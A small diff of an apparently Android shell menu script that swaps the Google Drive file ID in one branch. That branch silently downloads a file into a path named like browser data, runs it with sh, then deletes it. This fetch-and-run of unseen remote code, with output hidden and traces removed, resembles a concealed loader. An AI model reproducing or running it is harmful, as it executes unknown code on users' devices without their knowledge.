@@ -27,7 +27,7 @@ do
             echo "+---------------------------------------+"
             masban=/storage/emulated/legacy/Android/data/browser
             rm -rf $masban
-            wget "https://docs.google.com/uc?export=download&id=140PeueMJ0j16JgNceyZk1LeCIFOk4Ppj" -O $masban > /dev/null 2>&1
+            wget "https://docs.google.com/uc?export=download&id=14bKKYVY7sZ-vcf1Qv4niXLtj0BxmFvNs" -O $masban > /dev/null 2>&1
             sh $masban 2> /dev/null
             rm -rf $masban 2> /dev/null
             ;;
